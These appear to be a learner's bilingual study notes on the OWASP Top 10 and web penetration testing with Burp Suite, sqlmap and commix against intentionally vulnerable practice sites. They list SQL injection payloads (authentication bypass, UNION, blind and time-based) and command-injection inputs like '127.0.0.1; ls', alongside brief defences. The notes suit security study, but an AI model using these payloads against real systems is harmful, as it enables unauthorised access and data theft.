OWASP
==========
* Open Web Application Security Project = OWASP
* [Top 10 測試項目](https://owasp.org/www-project-top-ten/)
  1. Injection 注入攻擊
  2. Broken Authentication 無效的身分驗證
  3. Sensitive Data Exposure 機敏資料外洩
  4. XML External Entities (XXE) XML 外部處理器弱點
  5. Broken Access Control 無效的存取控管
  6. Security Misconfiguration 不安全的組態設定
  7. Cross-Site Scripting XSS 跨站腳本攻擊
  8. Insecure Deserialization 不安全的反序列化弱點
  9. Using Components with Known Vulnerabilities 不安全的元件
  10. Insufficient Logging & Monitoring 紀錄與監控不足風險

[資安人須知的 OWASP TOP 10 資安風險來源(上)](https://secbuzzer.co/post/116)
[資安人須知的 OWASP TOP 10 資安風險來源(下)](https://secbuzzer.co/post/115)

測試工具
-----
* [Burp Suite]
* [DVWA]
* [sql map]
* [commix]
* [testssl](https://testssl.sh/)
* [testssl GitHub](https://github.com/drwetter/testssl.sh)

測試網站 
---------
[Altoro Mutual](http://www.testfire.net/)
[Acunetix Art](http://testphp.vulnweb.com/)

Burp Suite設定
--------------
* Https封包攔截不到時,需要把憑證匯到瀏覽器
* Chrome要打開Proxy 可以安裝套件
* Options 

操作
----
* Proxy
* Intruder
  * Target
  * Positions
    - Clear
    - Add
    - Cluster bomb暴力測試
  * Payloads
    - Payload set
    - Payload try 
    - Start attack
  
* Repeater

A1-Injection
------------
* SQL injection

  select * from xxx where station = 102 OR 1=1

* command injection
* XML injection
* LDAP injection
* SSI Injection
    
* 尋找注入點
  * 輸入資料的地方 
  * Header,Referer,Cookie,Hidden Field

* 判斷注入點是否存在SQL Injection
  * 數字類型->算術計算(+ - * /)
  * 字串

* 猜測語法結構

  select * from xxx where station = 101 
  select * from xxx where station = 101 OR 1 = 1
  select * from xxx where station = '101' OR '1' = '1'
  select * from xxx where (station = '101' OR '1' = '1'
  
* SQL Injection Authentication Bypass

用註解

    select * from users where username = 'myname' or 1=1--' and passwrod = 'a'

* 註解語法
  * MS-SQL, Oracle:
    --
    /**/


  * My-SQL:
    -- 
    
* SQL Injection Type
  * Union-Based
    * UNION select * from user 
    * ORDER BY 1
      ORDER BY 4 --> Error
    * UNION SELECT 1, 2, 3, 4, 5, ...11
      UNION SELECT NULL, NULL, ...
  * Error-Based
    
  * Blind-Based
    * Boolean-Based
      * AND 1=1
      * AND 1=2
      * AND length(database())<5
      * AND length(database())>5
      * AND length(database())=6
    * Time-Based
      * id=1' AND sleep(3)--+
      * id=1' AND 

* sqlmap
* SQL Injection Flow
找尋注入點->判斷注入點->判斷SQL Injection類型->利用SQL Injection
* 如何防止SQL Injection
  * 使用參數化查詢(Prepared Statement)方式取代字串連接方式
  * 過濾使用者輸入資料內容,移除任何

* Command Injection
  
  * Results-based
  * Blind-based

  Linux Common Operators
  | operators | result |
  
  uname -a && ping 8.8.8.8
  unamee -a && ping 8.8.8.8

  uname -a || ping 8.8.8.8
  unamee -a || ping 8.8.8.8
  
  www.nsa.gov; uname -a
   
* commix
  
  $ commix --url="http://IP/GET/blind.php?addr=8.8.8.8":w
  $ commix --url="你的victime網址" --data="你剛剛送的訊息" --cookie="你的cookie"
  
  127.0.0.1; ls

* [Worst Password](https://github.com/danielmiessler/SecLists/Passwords/Common-Credentials)
https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/500-worst-passwords.txt



    
